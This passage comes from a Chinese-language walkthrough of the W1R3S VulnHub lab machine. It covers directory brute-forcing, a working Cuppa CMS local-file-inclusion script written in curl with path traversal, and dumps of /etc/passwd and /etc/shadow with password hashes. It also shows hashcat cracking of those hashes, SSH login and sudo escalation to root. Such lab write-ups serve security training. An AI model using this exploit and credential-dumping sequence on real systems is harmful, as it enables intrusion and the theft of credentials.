|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
990/tcp   closed ftps
3306/tcp  open   mysql           MySQL (unauthorized)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
```

目录爆破一波

``` bash
root@kali:~# dirb http://192.168.66.7/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jan  8 01:22:15 2020
URL_BASE: http://192.168.66.7/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.66.7/ ----
==> DIRECTORY: http://192.168.66.7/administrator/                                                     
+ http://192.168.66.7/index.html (CODE:200|SIZE:11321)                                                
==> DIRECTORY: http://192.168.66.7/javascript/                                                        
+ http://192.168.66.7/server-status (CODE:403|SIZE:277)                                               
==> DIRECTORY: http://192.168.66.7/wordpress/                                                         
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/ ----
==> DIRECTORY: http://192.168.66.7/administrator/alerts/                                              
==> DIRECTORY: http://192.168.66.7/administrator/api/                                                 
==> DIRECTORY: http://192.168.66.7/administrator/classes/                                             
==> DIRECTORY: http://192.168.66.7/administrator/components/                                          
==> DIRECTORY: http://192.168.66.7/administrator/extensions/                                          
+ http://192.168.66.7/administrator/index.php (CODE:302|SIZE:6946)                                    
==> DIRECTORY: http://192.168.66.7/administrator/installation/                                        
==> DIRECTORY: http://192.168.66.7/administrator/js/                                                  
==> DIRECTORY: http://192.168.66.7/administrator/language/                                            
==> DIRECTORY: http://192.168.66.7/administrator/media/                                               
+ http://192.168.66.7/administrator/robots.txt (CODE:200|SIZE:26)                                     
==> DIRECTORY: http://192.168.66.7/administrator/templates/                                           
                                                                                                      
---- Entering directory: http://192.168.66.7/javascript/ ----
==> DIRECTORY: http://192.168.66.7/javascript/jquery/                                                 
                                                                                                      
---- Entering directory: http://192.168.66.7/wordpress/ ----
+ http://192.168.66.7/wordpress/index.php (CODE:200|SIZE:55879)                                       
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/                                                
==> DIRECTORY: http://192.168.66.7/wordpress/wp-content/                                              
==> DIRECTORY: http://192.168.66.7/wordpress/wp-includes/                                             
+ http://192.168.66.7/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                         
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/alerts/ ----
+ http://192.168.66.7/administrator/alerts/index.html (CODE:200|SIZE:31)                              
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/api/ ----
==> DIRECTORY: http://192.168.66.7/administrator/api/administrator/                                   
+ http://192.168.66.7/administrator/api/index.php (CODE:200|SIZE:62)                                  
==> DIRECTORY: http://192.168.66.7/administrator/api/test/                                            
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/classes/ ----
==> DIRECTORY: http://192.168.66.7/administrator/classes/ajax/                                        
+ http://192.168.66.7/administrator/classes/index.html (CODE:200|SIZE:31)                             
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/components/ ----
==> DIRECTORY: http://192.168.66.7/administrator/components/configuration/                            
+ http://192.168.66.7/administrator/components/index.html (CODE:200|SIZE:31)                          
==> DIRECTORY: http://192.168.66.7/administrator/components/menu/                                     
==> DIRECTORY: http://192.168.66.7/administrator/components/stats/                                    
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/extensions/ ----
==> DIRECTORY: http://192.168.66.7/administrator/extensions/banners/                                  
==> DIRECTORY: http://192.168.66.7/administrator/extensions/content/                                  
+ http://192.168.66.7/administrator/extensions/index.html (CODE:200|SIZE:31)                          
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/installation/ ----
==> DIRECTORY: http://192.168.66.7/administrator/installation/html/                                   
+ http://192.168.66.7/administrator/installation/index.php (CODE:200|SIZE:4322)                       
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/js/ ----
==> DIRECTORY: http://192.168.66.7/administrator/js/filemanager/                                      
+ http://192.168.66.7/administrator/js/index.html (CODE:200|SIZE:31)                                  
==> DIRECTORY: http://192.168.66.7/administrator/js/jquery/                                           
==> DIRECTORY: http://192.168.66.7/administrator/js/tiny_mce/                                         
                                                                                                      
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/templates/ ----
==> DIRECTORY: http://192.168.66.7/administrator/templates/default/                                   
+ http://192.168.66.7/administrator/templates/index.html (CODE:200|SIZE:31)                           
                                                                                                      
---- Entering directory: http://192.168.66.7/javascript/jquery/ ----
+ http://192.168.66.7/javascript/jquery/jquery (CODE:200|SIZE:284394)                                 
                                                                                                      
---- Entering directory: http://192.168.66.7/wordpress/wp-admin/ ----
+ http://192.168.66.7/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                  
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/css/                                            
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/images/                                         
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/includes/                                       
+ http://192.168.66.7/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                  
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/js/                                             
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/maint/                                          
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/network/                                        
==> DIRECTORY: http://192.168.66.7/wordpress/wp-admin/user/                                           
                                                                                                      
---- Entering directory: http://192.168.66.7/wordpress/wp-content/ ----
+ http://192.168.66.7/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                
==> DIRECTORY: http://192.168.66.7/wordpress/wp-content/plugins/                                      
==> DIRECTORY: http://192.168.66.7/wordpress/wp-content/themes/                                       
==> DIRECTORY: http://192.168.66.7/wordpress/wp-content/upgrade/                                      
==> DIRECTORY: http://192.168.66.7/wordpress/wp-content/uploads/                                      
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/components/configuration/ ----
==> DIRECTORY: http://192.168.66.7/administrator/components/configuration/html/                       
+ http://192.168.66.7/administrator/components/configuration/index.php (CODE:200|SIZE:45)             
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/components/menu/ ----
==> DIRECTORY: http://192.168.66.7/administrator/components/menu/classes/                             
==> DIRECTORY: http://192.168.66.7/administrator/components/menu/html/                                
+ http://192.168.66.7/administrator/components/menu/index.php (CODE:200|SIZE:45)                      
                                                                                                      
---- Entering directory: http://192.168.66.7/administrator/components/stats/ ----
+ http://192.168.66.7/administrator/components/stats/index.php (CODE:200|SIZE:45)                                                                                                                                                                                                                                
---- Entering directory: http://192.168.66.7/administrator/templates/default/ ----
==> DIRECTORY: http://192.168.66.7/administrator/templates/default/classes/                           
==> DIRECTORY: http://192.168.66.7/administrator/templates/default/css/                               
==> DIRECTORY: http://192.168.66.7/administrator/templates/default/html/                              
==> DIRECTORY: http://192.168.66.7/administrator/templates/default/images/                            
+ http://192.168.66.7/administrator/templates/default/index.php (CODE:500|SIZE:0)                     
                                                                                                                                                                                                           
---- Entering directory: http://192.168.66.7/wordpress/wp-admin/network/ ----
+ http://192.168.66.7/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                          
+ http://192.168.66.7/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                          
                                                                                                      
---- Entering directory: http://192.168.66.7/wordpress/wp-admin/user/ ----
+ http://192.168.66.7/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                             
+ http://192.168.66.7/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                             
                                                                                                      
---- Entering directory: http://192.168.66.7/wordpress/wp-content/plugins/ ----
+ http://192.168.66.7/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                        
                                                                                                      
---- Entering directory: http://192.168.66.7/wordpress/wp-content/themes/ ----
+ http://192.168.66.7/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)
```

administrator目录原来是Cuppa CMS的安装设置。这是将浏览器指向/administrator时呈现出的页面。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub129.jpg)

根据官方文档，为了完成安装，必须首先创建数据库。

``` bash
Remember, the database should be created before to install Cuppa CMS.
```

首先，Cuppa CMS安装未完成，否则将看不到设置页面。下载了Cuppa CMS代码的副本，以查看是否可以发现任何漏洞。不确定这是否是新漏洞，但在第77行的alertConfigField.php中找到一个LFI漏洞令人惊喜。

![](https://hackso.me/assets/images/posts/w1r3s-1.0.1-walkthrough/screenshot-2.png)

为了测试它，编写了cat.sh，一个简单的脚本，只要有权限，它就会显示任何文件。

``` bash
#!/bin/bash

_HOST=192.168.66.7
_PATH=administrator/alerts/alertConfigField.php
_PARM=urlConfig
_TRAV=../../../../../../../..

curl -s --data-urlencode "${_PARM}=${_TRAV}$1" $_HOST/$_PATH \
| sed -r 's/^ {8}//' \
| sed '71,$!d' \
| sed '$d' \
| sed '$d'
```

运行脚本

``` bash
root@kali:~# ./cat.sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
root@kali:~# ./cat.sh /etc/shadow
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
```

可以看到/etc/shadow中有3个用户有密码hash，将hash值取出来放到hashcat中破解

``` bash
$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0
$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1
$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.
```

没办法，电脑GPU强，hashcat加载rockyou.txt字典几分钟就把3个hash值破解完了。。。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub130.jpg)

3个hash值里面，只有一个hash被破解出来了。。。

``` bash
D:\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -m 1800 password.txt --show
$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:computer
```

#### getshell

使用w1r3s/computer连接ssh

``` bash
root@kali:~# ssh w1r3s@192.168.66.7
The authenticity of host '192.168.66.7 (192.168.66.7)' can't be established.
ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.66.7' (ECDSA) to the list of known hosts.
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@192.168.66.7's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

228 packages can be updated.
0 updates are security updates.
                                                                                   
.....You made it huh?....                                                          
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35                             
w1r3s@W1R3S:~$ id                                                                           
uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
w1r3s@W1R3S:~$ whoami
w1r3s
```

#### 提权

看到w1r3s在sudoers列表中。

``` bash
w1r3s@W1R3S:~$ sudo -l
[sudo] password for w1r3s: 
Matching Defaults entries for w1r3s on W1R3S.localdomain:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S.localdomain:
    (ALL : ALL) ALL
```

直接提权拿到flag

``` bash
w1r3s@W1R3S:~$ sudo /bin/bash
root@W1R3S:~# id
uid=0(root) gid=0(root) groups=0(root)
root@W1R3S:~# whoami
root
root@W1R3S:~# cd /root
root@W1R3S:/root# ls
flag.txt
root@W1R3S:/root# cat flag.txt 
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
                                                                                        
-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \ 
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub131.jpg)

#### 总结

 - 枚举目录的能力-此技能可以节省大量时间，因为在许多情况下，会发现有趣的路径充当入口点。
 - 能够搜索运行服务的漏洞-在这种情况下，设法通过一个简单的Google搜索就发现了CUPPA漏洞。利用漏洞数据库和Google之类的搜索引擎可以节省大量时间。

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end W1R3S-1-0-1 -->

</details>

